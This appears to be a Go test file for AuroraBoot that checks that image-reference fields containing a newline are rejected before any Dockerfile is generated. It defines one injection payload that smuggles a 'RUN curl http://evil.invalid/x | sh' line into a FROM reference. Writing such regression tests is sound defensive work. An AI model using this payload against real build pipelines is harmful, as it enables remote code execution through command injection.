package auroraboot

import (
	"context"
	"errors"
	"os"
	"path/filepath"

	"github.com/kairos-io/AuroraBoot/pkg/builder"
	"github.com/kairos-io/AuroraBoot/pkg/store"
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

// injectedRef is a reference that, written into `FROM %s`, ends the FROM line
// and starts a RUN of the caller's choosing. It is the payload from
// kairos-io/kairos#5297.
const injectedRef = "ubuntu:24.04\nRUN curl http://evil.invalid/x | sh"

var _ = Describe("image reference guards", func() {
	Describe("Build", func() {
		DescribeTable("refuses an image reference that carries a newline",
			func(set func(*builder.BuildOptions)) {
				b := New(GinkgoT().TempDir(), nil, noopArtifactStore{})
				opts := builder.BuildOptions{ID: "guard"}
				set(&opts)

				_, err := b.Build(context.Background(), opts)
				Expect(err).To(HaveOccurred())
				Expect(errors.Is(err, builder.ErrInvalidBuildOptions)).To(BeTrue(),
					"the handler maps this error to 400; got %v", err)
			},
			Entry("base image", func(o *builder.BuildOptions) { o.BaseImage = injectedRef }),
			Entry("kairos-init image", func(o *builder.BuildOptions) { o.KairosInitImage = injectedRef }),
			Entry("hadron base", func(o *builder.BuildOptions) { o.HadronBase = injectedRef }),
		)

		It("still accepts every reference shape in use", func() {
			Expect(validateImageReferences(builder.BuildOptions{
				BaseImage:       "oci:quay.io/kairos/ubuntu:latest",
				KairosInitImage: "quay.io/kairos/kairos-init:v4.3.0",
				HadronBase:      "ghcr.io/kairos-io/hadron:v0.5.1",
			})).To(Succeed())
			Expect(validateImageReferences(builder.BuildOptions{})).To(Succeed(),
				"every image field is optional")
		})

		It("names the field and the rejected value", func() {
			err := validateImageReferences(builder.BuildOptions{BaseImage: injectedRef})
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(And(
				ContainSubstring("base image"),
				ContainSubstring("whitespace or control characters"),
				ContainSubstring("evil.invalid"),
			))
		})
	})

	// The render-time guard, reached with a value Build never saw: the Hadron
	// composer's base is prepended as a FROM line inside dockerBuild.
	It("dockerBuild writes no Dockerfile for a Hadron base with a newline", func() {
		outputDir := GinkgoT().TempDir()
		b := New(outputDir, nil, noopArtifactStore{})
		opts := builder.BuildOptions{ID: "render", Dockerfile: "RUN true\n", HadronBase: injectedRef}

		_, err := b.dockerBuild(context.Background(), opts, outputDir, nil)
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).To(ContainSubstring("hadron base"))
		_, statErr := os.Stat(filepath.Join(outputDir, "Dockerfile"))
		Expect(os.IsNotExist(statErr)).To(BeTrue(), "no Dockerfile may be written")
	})

	It("kairosify writes no Dockerfile for a base image with a newline", func() {
		outputDir := GinkgoT().TempDir()
		b := New(outputDir, nil, noopArtifactStore{})

		_, err := b.kairosify(context.Background(), injectedRef, builder.BuildOptions{ID: "render"}, outputDir, nil)
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).To(ContainSubstring("base image"))
		_, statErr := os.Stat(filepath.Join(outputDir, "Dockerfile.kairosify"))
		Expect(os.IsNotExist(statErr)).To(BeTrue(), "no Dockerfile may be written")
	})

	It("an extension refuses an artifact image with a newline", func() {
		outputDir := GinkgoT().TempDir()
		eb := NewExtensionBuilder(outputDir, nil).
			WithArtifactStore(&oneArtifactStore{image: injectedRef})
		opts := builder.ExtensionBuildOptions{
			ID: "ext",
			Source: builder.ExtensionSource{
				Mode:             "artifact",
				SourceArtifactID: "a1",
				ExtraSteps:       "RUN true",
			},
		}

		_, err := eb.resolveSource(context.Background(), opts, outputDir, nil)
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).To(ContainSubstring("artifact container image"))
		_, statErr := os.Stat(filepath.Join(outputDir, "Dockerfile"))
		Expect(os.IsNotExist(statErr)).To(BeTrue(), "no Dockerfile may be written")
	})

	It("an extension refuses a source image with a newline", func() {
		outputDir := GinkgoT().TempDir()
		eb := NewExtensionBuilder(outputDir, nil)
		opts := builder.ExtensionBuildOptions{
			ID:     "ext",
			Source: builder.ExtensionSource{Mode: "image", BaseImage: injectedRef},
		}

		_, err := eb.resolveSource(context.Background(), opts, outputDir, nil)
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).To(ContainSubstring("source.baseImage"))
	})
})

// oneArtifactStore answers GetByID with a single record, so resolveSource can
// reach the FROM line without a database.
type oneArtifactStore struct {
	noopArtifactStore
	image string
}

func (s *oneArtifactStore) GetByID(context.Context, string) (*store.ArtifactRecord, error) {
	return &store.ArtifactRecord{ID: "a1", ContainerImage: s.image}, nil
}
